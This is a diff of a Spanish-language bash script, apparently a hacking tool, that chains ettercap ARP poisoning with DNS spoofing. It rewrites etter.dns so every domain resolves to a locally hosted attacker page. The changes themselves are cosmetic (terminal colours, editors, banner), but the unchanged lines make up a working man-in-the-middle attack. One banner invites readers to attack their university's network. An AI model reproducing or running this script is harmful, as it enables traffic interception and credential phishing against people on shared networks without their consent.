@@ -1,3 +1,4 @@
+
 #!/bin/bash
 
 ####################
@@ -64,13 +65,13 @@ sleep 1
 echo "[1;34m --> Poniendo en marcha envenenamiento ARP..."
 echo "[1;31m"
 INTERFACE="$(ip route show|grep ' src '|cut -d' ' -f3)"
-xterm -title "ARP Poisoning" -fg blue -e "ettercap -TM arp:remote // // -i $INTERFACE -P autoadd" & ETTER_1=$!
+xterm -title "ARP Poisoning" -fg green -e "ettercap -TM arp:remote // // -i $INTERFACE -P autoadd" & ETTER_1=$!
 sleep 1
 echo "[1;34m --> Poniendo en marcha falsificación de resoluciones DNS..."
 echo "[1;31m"
 SERVER="$(ip route show|grep ' src '|cut -d' ' -f12)"
 echo "* A $SERVER" >/etc/ettercap/etter.dns
-xterm -title "DNS Spoofing" -fg blue -e "ettercap -Tq -i $INTERFACE -P dns_spoof" & ETTER_2=$!
+xterm -title "DNS Spoofing" -fg green -e "ettercap -Tq -i $INTERFACE -P dns_spoof" & ETTER_2=$!
 sleep 1
 echo "[0m --------------------------------------------------------------------------- "
 echo " [1;33mEl ataque se está ejecutando!"
@@ -101,7 +102,7 @@ echo -n " ?> "
 read RESP
 case $RESP in
 	1 ) sleep 1; clear; banner; attack;;
-	2 ) sleep 1; (kwrite "$TMP/www/index.html"||mousepad "$TMP/www/index.html") & banner; readoption;;
+	2 ) sleep 1; (geany "$TMP/www/index.html"||leafpad "$TMP/www/index.html") & banner; readoption;;
 	3 ) sleep 1; firefox "$TMP/www/index.html" & banner; readoption;;
 	0 ) sleep 1; clear; rm -rf "$TMP"; exit;;
 	* ) sleep 1; echo "[1;34m
@@ -113,18 +114,20 @@ esac
 banner() {
 clear
 sleep 0.1s; echo " [1;34m                                                                    "
-sleep 0.1s; echo " ####### #           #####     #    #######    #    ######  ####### ######  "
-sleep 0.1s; echo " #       #          #     #   # #        #    # #   #     # #     # #     # "
-sleep 0.1s; echo " #       #          #        #   #      #    #   #  #     # #     # #     # "
-sleep 0.1s; echo " #####   #          #       #     #    #    #     # #     # #     # ######  "
-sleep 0.1s; echo " #       #          #       #######   #     ####### #     # #     # #   #   "
-sleep 0.1s; echo " #       #          #     # #     #  #      #     # #     # #     # #    #  "
-sleep 0.1s; echo " ####### #######     #####  #     # ####### #     # ######  ####### #     # "
-
+sleep 0.1s; echo "╔════╦╗────╔══╗╔╗────────╔╦═══╗──────╔╗"
+sleep 0.1s; echo "║╔╗╔╗║║────║╔╗║║║────────║║╔═╗║──────║║"
+sleep 0.1s; echo "╚╝║║╚╣╚═╦══╣╚╝╚╣║╔══╦══╦═╝║╚══╦╗─╔╦══╣║"
+sleep 0.1s; echo "──║║─║╔╗║║═╣╔═╗║║║╔╗║╔╗║╔╗╠══╗║║─║║══╬╝"
+sleep 0.1s; echo "──║║─║║║║║═╣╚═╝║╚╣╚╝║╚╝║╚╝║╚═╝║╚═╝╠══╠╗"
+sleep 0.1s; echo "──╚╝─╚╝╚╩══╩═══╩═╩══╩══╩══╩═══╩═╗╔╩══╩╝"
+sleep 0.1s; echo "──────────────────────────────╔═╝║"
+sleep 0.1s; echo "──────────────────────────────╚══╝"
+sleep 0.1s; echo ">>>>>>OneHackerLife!<<<<<!"
 sleep 0.1s; echo "                                                                        [0m"
 echo " ---------------------------------------------------------------------------
- [1;33mHackea la red  de tu universidad con este sencillo script 
-  solo debes tener ettercap instalado en tu computador ! 
+ [1;33m ->THebloodSys! envenanmiento de ip y ademas dns spoofing para 
+             resolver las direcciones y apuntarlas hacia  nuestro servidor 
+             montado localmente con nuestra configuracion.! 
   [0m
  --------------------------------------------------------------------------- "
 }
